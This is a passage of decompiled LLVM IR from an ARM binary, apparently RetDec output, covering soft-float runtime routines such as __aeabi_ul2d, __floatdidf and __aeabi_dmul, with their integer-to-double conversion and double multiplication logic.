  call void @__pseudo_cond_branch(i1 %v1_16de4, i32 %v0_16de4)
  %v0_16de8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16de8 = icmp eq i32 %v0_16de8, 0
  br i1 %v2_16de8, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_16dec = load i32, i32* @r3, align 4
  %v4_16dec = icmp eq i32 %v1_16dec, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_16df0 = phi i1 [ true, %.thread1 ], [ %v4_16dec, %bb9 ]
  %v0_16df0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_16df0, i32 %v0_16df0)
  store i32 896, i32* @r4, align 4
  %v0_16dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_16dfc = and i32 %v0_16dfc, -2147483648
  store i32 %v1_16dfc, i32* @r5, align 4
  %tmp = bitcast i32 %v0_16dfc to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_16e00 = bitcast float %tmp11 to i32
  store i32 %v1_16e00, i32* @r1, align 4
  %v0_16e04 = call i32 @function_16bbc()
  ret i32 %v0_16e04

; uselistorder directives
  uselistorder i32 %v3_16dcc, { 1, 2, 0 }
  uselistorder i32 %v2_16dc8, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_16bbc, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_16e08 = or i32 %arg2, %arg1
  %v4_16e08 = icmp eq i32 %v2_16e08, 0
  %v0_16e0c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_16e08, i32 %v0_16e0c)
  store i32 0, i32* @r5, align 4
  %v0_16e18 = call i32 @function_16e38()
  ret i32 %v0_16e18
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_16e1c = or i32 %arg2, %arg1
  %v4_16e1c = icmp eq i32 %v2_16e1c, 0
  %v0_16e20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_16e1c, i32 %v0_16e20)
  %v1_16e2c = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_16e2c, i32 ptrtoint (i32* @global_var_16e38.591 to i32))
  %v1_16e30 = sub i32 0, %arg1
  ret i32 %v1_16e30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_16e38() local_unnamed_addr {
dec_label_pc_16e38:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_16e40 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_16e40, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_16b5c.589 to i32))
  %tmp6 = icmp ult i32 %v0_16e40, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_16e38
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_16e38, %bb
  %v1_16e58 = phi i32 [ 3, %dec_label_pc_16e38 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_16e40, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_16e58 = add nuw nsw i32 %v1_16e58, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_16e5c = phi i32 [ %v1_16e58, %bb3 ], [ %v2_16e58, %bb4 ]
  %not. = icmp slt i32 %v0_16e40, 0
  %v4_16e5c = zext i1 %not. to i32
  %v5_16e5c = add nsw i32 %v0_16e5c, %v4_16e5c
  %v1_16e60 = sub nsw i32 32, %v5_16e5c
  %v0_16e64 = load i32, i32* @r0, align 4
  %v6_16e64 = shl i32 %v0_16e64, %v1_16e60
  store i32 %v6_16e64, i32* @ip, align 4
  %v6_16e68 = lshr i32 %v0_16e64, %v5_16e5c
  %v1_16e6c = load i32, i32* @r1, align 4
  %v7_16e6c = shl i32 %v1_16e6c, %v1_16e60
  %v8_16e6c = or i32 %v7_16e6c, %v6_16e68
  %v6_16e70 = lshr i32 %v1_16e6c, %v5_16e5c
  %v0_16e74 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e74 = add i32 %v0_16e74, %v5_16e5c
  store i32 %v2_16e74, i32* @r4, align 4
  %v4_16e78 = sext i32 %v8_16e6c to i64
  %v5_16e78 = call i32 @function_16b5c(i64 %v4_16e78, i32 %v6_16e70, i32 %v5_16e5c, i32 %v1_16e60)
  ret i32 %v5_16e78

; uselistorder directives
  uselistorder i32 %v5_16e5c, { 2, 0, 1, 3, 4 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16e7c = load i32, i32* @r4, align 4
  store i32 %v3_16e7c, i32* %stack_var_-16, align 4
  %v12_16e7c = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_16e88 = udiv i32 %arg2, 1048576
  %v5_16e88 = urem i32 %v4_16e88, 2048
  store i32 %v5_16e88, i32* %r4.global-to-local, align 4
  %v6_16e88 = icmp eq i32 %v5_16e88, 0
  br i1 %v6_16e88, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_16e8c = udiv i32 %arg4, 1048576
  %v6_16e8c = urem i32 %v5_16e8c, 2048
  store i32 %v6_16e8c, i32* @r5, align 4
  %v7_16e8c = icmp eq i32 %v6_16e8c, 0
  br i1 %v7_16e8c, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_16e90 = icmp eq i32 %v5_16e88, 2047
  br i1 %v5_16e90, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_16e94 = icmp eq i32 %v6_16e8c, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_16e98 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_16e94, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_16e9c.594 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_16e98, i32 ptrtoint (i32* @global_var_17074.592 to i32))
  %v0_16e9c = load i32, i32* %r4.global-to-local, align 4
  %v1_16e9c = load i32, i32* @r5, align 4
  %v2_16e9c = add i32 %v1_16e9c, %v0_16e9c
  store i32 %v2_16e9c, i32* %r4.global-to-local, align 4
  %v2_16ea0 = xor i32 %arg4, %arg2
  %v1_16ea4 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_16ea4, -2097152
  %v5_16ea4 = add i32 %tmp51, -1
  %v6_16ea4 = and i32 %v5_16ea4, %arg2
  store i32 %v6_16ea4, i32* %r1.global-to-local, align 4
  %v6_16ea8 = and i32 %v5_16ea4, %arg4
  %v5_16eac = mul i32 %arg2, 4096
  %v6_16eac = or i32 %v5_16eac, %tmp32
  %v8_16eac = icmp eq i32 %v6_16eac, 0
  br i1 %v8_16eac, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_16eb45 = or i32 %v6_16ea4, 1048576
  store i32 %v1_16eb45, i32* %r1.global-to-local, align 4
  %v1_16eb87 = or i32 %v6_16ea8, 1048576
  br label %dec_label_pc_16f38

bb40:                                             ; preds = %.thread2
  %v6_16eb0 = mul i32 %arg4, 4096
  %v7_16eb0 = or i32 %v6_16eb0, %arg3
  %v9_16eb0 = icmp eq i32 %v7_16eb0, 0
  %v1_16eb4 = or i32 %v6_16ea4, 1048576
  store i32 %v1_16eb4, i32* %r1.global-to-local, align 4
  %v1_16eb8 = or i32 %v6_16ea8, 1048576
  br i1 %v9_16eb0, label %dec_label_pc_16f38, label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %bb40
  %v6_16ec0 = mul nuw i64 %tmp, %arg1
  %v7_16ec0 = udiv i64 %v6_16ec0, 4294967296
  %v9_16ec0 = trunc i64 %v6_16ec0 to i32
  store i32 %v9_16ec0, i32* %ip.global-to-local, align 4
  %v7_16ec8 = zext i32 %v1_16eb4 to i64
  %v11_16ec8 = mul nuw nsw i64 %v7_16ec8, %tmp
  %v12_16ec8 = add i64 %v11_16ec8, %v7_16ec0
  %v1_16ecc = and i32 %v2_16ea0, -2147483648
  %v10_16ed0 = zext i32 %v1_16eb8 to i64
  %v11_16ed0 = mul nuw i64 %v10_16ed0, %arg1
  %v12_16ed0 = add i64 %v12_16ec8, %v11_16ed0
  %v13_16ed0 = udiv i64 %v12_16ed0, 4294967296
  %v15_16ed0 = trunc i64 %v12_16ed0 to i32
  %v10_16ed8 = mul nuw i64 %v10_16ed0, %v7_16ec8
  %v11_16ed8 = add i64 %v13_16ed0, %v10_16ed8
  %v12_16ed8 = udiv i64 %v11_16ed8, 4294967296
  %v13_16ed8 = trunc i64 %v12_16ed8 to i32
  %v14_16ed8 = trunc i64 %v11_16ed8 to i32
  %v2_16edc = icmp eq i32 %v9_16ec0, 0
  br i1 %v2_16edc, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_16ec0
  %v2_16ee0 = or i32 %v15_16ed0, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_16ec0, %bb41
  %storemerge = phi i32 [ %v2_16ee0, %bb41 ], [ %v15_16ed0, %dec_label_pc_16ec0 ]
  %v0_16ef4 = phi i32 [ %v2_16ee0, %bb41 ], [ %v15_16ed0, %dec_label_pc_16ec0 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_16ee4 = add i32 %v2_16e9c, -255
  %v2_16ee8 = icmp ugt i32 %v13_16ed8, 511
  %v2_16eec = icmp eq i1 %v2_16ee8, false
  %v3_16eec = add i32 %v2_16e9c, -1023
  %v5_16eec = sext i1 %v2_16eec to i32
  %v6_16eec = add i32 %v3_16eec, %v5_16eec
  store i32 %v6_16eec, i32* %r4.global-to-local, align 4
  %v3_16ef0 = icmp ugt i32 %v1_16ee4, 768
  br i1 %v3_16ef0, label %dec_label_pc_16f00, label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %bb42
  %v1_16ef4 = icmp slt i32 %v0_16ef4, 0
  %v2_16ef4 = mul i32 %v0_16ef4, 2
  store i32 %v2_16ef4, i32* %lr.global-to-local, align 4
  %v3_16ef8 = mul i32 %v14_16ed8, 2
  %v4_16ef8 = zext i1 %v1_16ef4 to i32
  %v5_16ef8 = or i32 %v4_16ef8, %v3_16ef8
  %v9_16ef8 = icmp ule i32 %v5_16ef8, %v14_16ed8
  %v10_16ef8 = icmp ult i32 %v3_16ef8, %v14_16ed8
  %v11_16ef8 = select i1 %v1_16ef4, i1 %v9_16ef8, i1 %v10_16ef8
  %v3_16efc25 = mul nuw nsw i64 %v12_16ed8, 2
  %v3_16efc = trunc i64 %v3_16efc25 to i32
  %v4_16efc = zext i1 %v11_16ef8 to i32
  %v5_16efc = or i32 %v4_16efc, %v3_16efc
  br label %dec_label_pc_16f00

dec_label_pc_16f00:                               ; preds = %bb42, %dec_label_pc_16ef4
  %v0_16f10 = phi i32 [ %v0_16ef4, %bb42 ], [ %v2_16ef4, %dec_label_pc_16ef4 ]
  %v0_16f08 = phi i32 [ %v14_16ed8, %bb42 ], [ %v5_16ef8, %dec_label_pc_16ef4 ]
  %v1_16f00 = phi i32 [ %v13_16ed8, %bb42 ], [ %v5_16efc, %dec_label_pc_16ef4 ]
  %v4_16f00 = mul i32 %v1_16f00, 2048
  %v4_16f04 = udiv i32 %v0_16f08, 2097152
  %v5_16f00 = or i32 %v4_16f04, %v1_16ecc
  %v5_16f04 = or i32 %v5_16f00, %v4_16f00
  store i32 %v5_16f04, i32* %r1.global-to-local, align 4
  %v3_16f08 = mul i32 %v0_16f08, 2048
  %v4_16f0c = udiv i32 %v0_16f10, 2097152
  %v5_16f0c = or i32 %v3_16f08, %v4_16f0c
  store i32 %v5_16f0c, i32* %r0.global-to-local, align 4
  %v3_16f10 = mul i32 %v0_16f10, 2048
  store i32 %v3_16f10, i32* %lr.global-to-local, align 4
  %v1_16f14 = add i32 %v6_16eec, -253
  store i32 %v1_16f14, i32* %ip.global-to-local, align 4
  %v2_16f14 = icmp ugt i32 %v6_16eec, 252
  %v7_16f14 = icmp eq i32 %v6_16eec, 253
  %v2_16f18 = xor i1 %v7_16f14, true
  %v3_16f18 = and i1 %v2_16f14, %v2_16f18
  br i1 %v3_16f18, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_16f00
  %v6_16f18 = icmp ugt i32 %v1_16f14, 1791
  %v11_16f18 = icmp eq i32 %v1_16f14, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_16f00, %bb43
  %v1_16f1c = phi i1 [ %v7_16f14, %dec_label_pc_16f00 ], [ %v11_16f18, %bb43 ]
  %v0_16f1c = phi i1 [ %v2_16f14, %dec_label_pc_16f00 ], [ %v6_16f18, %bb43 ]
  %v2_16f1c = xor i1 %v1_16f1c, true
  %v3_16f1c = and i1 %v0_16f1c, %v2_16f1c
  call void @__pseudo_cond_branch(i1 %v3_16f1c, i32 ptrtoint (i32* @global_var_16f68.593 to i32))
  %v0_16f20 = load i32, i32* %lr.global-to-local, align 4
  %v2_16f20 = icmp slt i32 %v0_16f20, 0
  %v6_16f20 = icmp eq i32 %v0_16f20, -2147483648
  %v1_16f24 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_16f20, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_16f24 = urem i32 %v1_16f24, 2
  %v3_16f24 = icmp ne i32 %v2_16f24, 0
  %v4_16f24 = udiv i32 %v1_16f24, 2
  store i32 %v4_16f24, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_16f28 = phi i1 [ %v3_16f24, %bb45 ], [ %v2_16f20, %bb44 ]
  %v2_16f28 = zext i1 %v1_16f28 to i32
  %v3_16f28 = add i32 %v2_16f28, %v1_16f24
  store i32 %v3_16f28, i32* %r0.global-to-local, align 4
  %v0_16f2c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f2c = load i32, i32* %r4.global-to-local, align 4
  %v2_16f2c = and i32 %v1_16f2c, 4096
  %v3_16f2c = icmp ne i32 %v2_16f2c, 0
  %v4_16f2c = mul i32 %v1_16f2c, 1048576
  %v6_16f2c = add i32 %v4_16f2c, %v0_16f2c
  %v7_16f2c = zext i1 %v3_16f2c to i32
  %v8_16f2c = add i32 %v7_16f2c, %v6_16f2c
  store i32 %v8_16f2c, i32* %r1.global-to-local, align 4
  %v2_16f30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16f30, i32* %r4.global-to-local, align 4
  store i32 %v12_16e7c, i32* %lr.global-to-local, align 4
  ret i32 %v3_16f28

dec_label_pc_16f38:                               ; preds = %.thread3, %bb40
  %v1_16f44 = phi i32 [ %v1_16eb87, %.thread3 ], [ %v1_16eb8, %bb40 ]
  %v1_16f3c = phi i32 [ %v1_16eb45, %.thread3 ], [ %v1_16eb4, %bb40 ]
  %v1_16f38 = and i32 %v2_16ea0, -2147483648
  %v2_16f3c = or i32 %v1_16f3c, %v1_16f38
  %v4_16f401 = or i64 %tmp, %arg1
  %v4_16f40 = trunc i64 %v4_16f401 to i32
  store i32 %v4_16f40, i32* %r0.global-to-local, align 4
  %v2_16f44 = xor i32 %v2_16f3c, %v1_16f44
  store i32 %v2_16f44, i32* %r1.global-to-local, align 4
  %v4_16f48 = udiv i32 %v1_16ea4, 2
  %v5_16f48 = sub i32 %v2_16e9c, %v4_16f48
  store i32 %v5_16f48, i32* %r4.global-to-local, align 4
  %v7_16f48 = sub i32 0, %v5_16f48
  %v8_16f48 = and i32 %v2_16e9c, %v7_16f48
  %v11_16f48 = icmp eq i32 %v2_16e9c, %v4_16f48
  %v7_16f4c = icmp sgt i32 %v2_16e9c, %v4_16f48
  br i1 %v7_16f4c, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_16f38
  %v10_16f4c = sub i32 %v1_16ea4, %v5_16f48
  %v12_16f4c = xor i32 %v5_16f48, %v1_16ea4
  %v13_16f4c = xor i32 %v10_16f4c, %v1_16ea4
  %v14_16f4c = and i32 %v13_16f4c, %v12_16f4c
  %v17_16f4c = icmp eq i32 %v1_16ea4, %v5_16f48
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16f38, %bb46
  %v3_16f58.in = phi i32 [ %v8_16f48, %dec_label_pc_16f38 ], [ %v14_16f4c, %bb46 ]
  %v2_16f58.in = phi i32 [ %v5_16f48, %dec_label_pc_16f38 ], [ %v10_16f4c, %bb46 ]
  %v1_16f58 = phi i1 [ %v11_16f48, %dec_label_pc_16f38 ], [ %v17_16f4c, %bb46 ]
  %v2_16f58 = icmp slt i32 %v2_16f58.in, 0
  %v3_16f58 = icmp slt i32 %v3_16f58.in, 0
  %v3_16f50 = xor i1 %v3_16f58, %v2_16f58
  %v4_16f50 = or i1 %v1_16f58, %v3_16f50
  br i1 %v4_16f50, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_16f58.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_16f5030 = mul i32 %v5_16f48, 1048576
  %v10_16f5031 = or i32 %v2_16f44, %v9_16f5030
  store i32 %v10_16f5031, i32* %r1.global-to-local, align 4
  %v7_16f54 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_16f54, i32* %r4.global-to-local, align 4
  store i32 %v12_16e7c, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_16f58 = phi i32 [ %v0_16f58.pre, %._crit_edge23 ], [ %v12_16e7c, %bb48 ]
  %v6_16f58 = xor i1 %v4_16f50, true
  call void @__pseudo_cond_branch(i1 %v6_16f58, i32 %v0_16f58)
  %v0_16f5c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f5c = or i32 %v0_16f5c, 1048576
  store i32 %v1_16f5c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_16f64 = load i32, i32* %r4.global-to-local, align 4
  %v1_16f64 = add i32 %v0_16f64, -1
  store i32 %v1_16f64, i32* %r4.global-to-local, align 4
  ret i32 %v4_16f40

; uselistorder directives
  uselistorder i32 %v5_16f48, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_16f48, { 2, 1, 0 }
  uselistorder i32 %v1_16f24, { 2, 0, 1 }
  uselistorder i32 %v0_16f20, { 1, 0 }
  uselistorder i1 %v7_16f14, { 1, 0 }
  uselistorder i32 %v2_16ef4, { 1, 0 }
  uselistorder i1 %v1_16ef4, { 1, 0 }
  uselistorder i32 %v6_16eec, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16ef4, { 1, 0, 2 }
  uselistorder i32 %v14_16ed8, { 1, 3, 2, 0 }
  uselistorder i64 %v11_16ed8, { 1, 0 }
  uselistorder i64 %v12_16ed0, { 1, 0 }
  uselistorder i64 %v10_16ed0, { 1, 0 }
  uselistorder i64 %v7_16ec8, { 1, 0 }
  uselistorder i64 %v6_16ec0, { 1, 0 }
  uselistorder i32 %v6_16ea8, { 1, 0 }
  uselistorder i32 %v6_16ea4, { 1, 0, 2 }
  uselistorder i32 %v1_16ea4, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_16e9c, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_16e8c, { 2, 1, 0 }
  uselistorder i32 %v5_16e88, { 2, 1, 0 }
  uselistorder i32 %v12_16e7c, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 10, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16f38, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_16f00, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_16f68() local_unnamed_addr {
dec_label_pc_16f68:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_16f68 = load i1, i1* @cpsr_z, align 1
  %v1_16f68 = load i1, i1* @cpsr_n, align 1
  %v2_16f68 = load i1, i1* @cpsr_v, align 1
  %v3_16f68 = xor i1 %v1_16f68, %v2_16f68
  %v4_16f68 = or i1 %v0_16f68, %v3_16f68
  br i1 %v4_16f68, label %dec_label_pc_16f6c, label %dec_label_pc_170e4

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f68
  %v0_16f6c = load i32, i32* @r4, align 4
  %v4_16f6c = add i32 %v0_16f6c, 54
  %v6_16f6c = sub i32 0, %v0_16f6c
  %v7_16f6c = and i32 %v4_16f6c, %v6_16f6c
  %v8_16f6c = icmp slt i32 %v7_16f6c, 0
  %v9_16f6c = icmp slt i32 %v4_16f6c, 0
  %v10_16f6c = icmp eq i32 %v4_16f6c, 0
  %v7_16f70 = icmp sgt i32 %v0_16f6c, -54
  br i1 %v7_16f70, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16f6c
  store i32 0, i32* @r0, align 4
  %v8_16f74 = load i32, i32* @r1, align 4
  %v9_16f74 = and i32 %v8_16f74, -2147483648
  store i32 %v9_16f74, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16f6c, %bb
  %v4_16f7c = xor i1 %v9_16f6c, %v8_16f6c
  %v5_16f7c = or i1 %v10_16f6c, %v4_16f7c
  call void @__pseudo_cond_branch(i1 %v5_16f7c, i32 %tmp7)
  %v0_16f80 = load i32, i32* @r4, align 4
  %v1_16f80 = sub i32 0, %v0_16f80
  %v2_16f84 = sub i32 -32, %v0_16f80
  %v4_16f84 = add i32 %v0_16f80, 31
  %v5_16f84 = and i32 %v4_16f84, %v1_16f80
  %v6_16f84 = icmp slt i32 %v5_16f84, 0
  store i1 %v6_16f84, i1* @cpsr_v, align 1
  %v6_16f88 = icmp slt i32 %v1_16f80, 32
  br i1 %v6_16f88, label %dec_label_pc_16f8c, label %dec_label_pc_16ff8

dec_label_pc_16f8c:                               ; preds = %.thread1
  %v1_16f8c = add i32 %v2_16f84, 12
  %v8_16f90 = icmp sgt i32 %v1_16f8c, 0
  br i1 %v8_16f90, label %dec_label_pc_16fc8, label %dec_label_pc_16f94

dec_label_pc_16f94:                               ; preds = %dec_label_pc_16f8c
  %v1_16f94 = add i32 %v2_16f84, 32
  %v1_16f98 = sub i32 0, %v2_16f84
  %v0_16f9c = load i32, i32* @r0, align 4
  %v6_16f9c = shl i32 %v0_16f9c, %v1_16f98
  %v2_16fa0 = add i32 %v2_16f84, 31
  %v3_16fa0 = shl i32 1, %v2_16fa0
  %v6_16fa0 = lshr i32 %v0_16f9c, %v1_16f94
  %v1_16fa4 = load i32, i32* @r1, align 4
  %v7_16fa4 = shl i32 %v1_16fa4, %v1_16f98
  %v8_16fa4 = or i32 %v7_16fa4, %v6_16fa0
  %v1_16fa8 = and i32 %v1_16fa4, -2147483648
  %tmp = bitcast i32 %v1_16fa4 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_16fac = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_16f9c, 0
  %v4_16fb0 = zext i1 %tmp20 to i32
  %v5_16fb0 = add i32 %v8_16fa4, %v4_16fb0
  %v5_16fb4 = and i32 %v1_16fac, %v3_16fa0
  %v6_16fb4 = icmp ne i32 %v5_16fb4, 0
  %v7_16fb4 = lshr i32 %v1_16fac, %v1_16f94
  %v9_16fb4 = add i32 %v7_16fb4, %v1_16fa8
  %v10_16fb4 = zext i1 %v6_16fb4 to i32
  %v11_16fb4 = add i32 %v9_16fb4, %v10_16fb4
  store i32 %v11_16fb4, i32* @r1, align 4
  %v19_16fb4 = add i32 %v11_16fb4, %v10_16fb4
  %v20_16fb4 = xor i32 %v19_16fb4, %v1_16fa4
  %v21_16fb4 = xor i32 %v19_16fb4, %v7_16fb4
  %v22_16fb4 = and i32 %v20_16fb4, %v21_16fb4
  %v23_16fb4 = icmp slt i32 %v22_16fb4, 0
  store i1 %v23_16fb4, i1* @cpsr_v, align 1
  %v3_16fb8 = mul i32 %v6_16f9c, 2
  %v4_16fb8 = or i32 %v3_16fb8, %tmp7
  %v5_16fb8 = icmp slt i32 %v4_16fb8, 0
  store i1 %v5_16fb8, i1* @cpsr_n, align 1
  %v6_16fb8 = icmp eq i32 %v4_16fb8, 0
  store i1 %v6_16fb8, i1* @cpsr_z, align 1
  br i1 %v6_16fb8, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_16f94
  %tmp21 = sext i1 %tmp20 to i32
  %v6_16fbc = add nsw i32 %tmp21, -1
  %v7_16fbc = and i32 %v5_16fb0, %v6_16fbc
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_16f94, %bb13
  %v1_16fc4 = phi i32 [ %v5_16fb0, %dec_label_pc_16f94 ], [ %v7_16fbc, %bb13 ]
  %v2_16fc0 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_16fc0, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_16fc4

dec_label_pc_16fc8:                               ; preds = %dec_label_pc_16f8c
  %v1_16fc8 = sub i32 0, %v2_16f84
  %v1_16fcc = add i32 %v2_16f84, 32
  %v0_16fd0 = load i32, i32* @r0, align 4
  %v6_16fd0 = shl i32 %v0_16fd0, %v1_16fc8
  %v6_16fd4 = lshr i32 %v0_16fd0, %v1_16fcc
  %v1_16fd8 = load i32, i32* @r1, align 4
  %v7_16fd8 = shl i32 %v1_16fd8, %v1_16fc8
  %v8_16fd8 = or i32 %v7_16fd8, %v6_16fd4
  %v1_16fdc = and i32 %v1_16fd8, -2147483648
  %tmp22 = icmp slt i32 %v6_16fd0, 0
  %v4_16fe0 = zext i1 %tmp22 to i32
  %v5_16fe0 = add i32 %v8_16fd8, %v4_16fe0
  %v6_16fe0 = icmp ult i32 %v5_16fe0, %v8_16fd8
  %v2_16fe4 = zext i1 %v6_16fe0 to i32
  %v3_16fe4 = or i32 %v2_16fe4, %v1_16fdc
  store i32 %v3_16fe4, i32* @r1, align 4
  %v9_16fe4 = add nsw i32 %v3_16fe4, %v2_16fe4
  %v10_16fe4 = sub i32 0, %v1_16fd8
  %v11_16fe4 = and i32 %v9_16fe4, %v10_16fe4
  %v12_16fe4 = icmp slt i32 %v11_16fe4, 0
  store i1 %v12_16fe4, i1* @cpsr_v, align 1
  %v3_16fe8 = mul i32 %v6_16fd0, 2
  %v4_16fe8 = or i32 %v3_16fe8, %tmp7
  %v5_16fe8 = icmp slt i32 %v4_16fe8, 0
  store i1 %v5_16fe8, i1* @cpsr_n, align 1
  %v6_16fe8 = icmp eq i32 %v4_16fe8, 0
  store i1 %v6_16fe8, i1* @cpsr_z, align 1
  br i1 %v6_16fe8, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_16fc8
  %tmp23 = sext i1 %tmp22 to i32
  %v6_16fec = add nsw i32 %tmp23, -1
  %v7_16fec = and i32 %v5_16fe0, %v6_16fec
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_16fc8, %bb15
  %v1_16ff4 = phi i32 [ %v5_16fe0, %dec_label_pc_16fc8 ], [ %v7_16fec, %bb15 ]
  %v2_16ff0 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_16ff0, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_16ff4

dec_label_pc_16ff8:                               ; preds = %.thread1
  %v1_16ff8 = sub i32 32, %v2_16f84
  %v1_16ffc = load i32, i32* @r0, align 4
  %v7_16ffc = shl i32 %v1_16ffc, %v1_16ff8
  %v8_16ffc = or i32 %v7_16ffc, %tmp7
  %v6_17000 = lshr i32 %v1_16ffc, %v2_16f84
  %v1_17004 = load i32, i32* @r1, align 4
  %v7_17004 = shl i32 %v1_17004, %v1_16ff8
  %v8_17004 = or i32 %v7_17004, %v6_17000
  %v6_17008 = lshr i32 %v1_17004, %v2_16f84
  %v1_1700c = and i32 %v1_17004, -2147483648
  store i32 %v1_1700c, i32* @r1, align 4
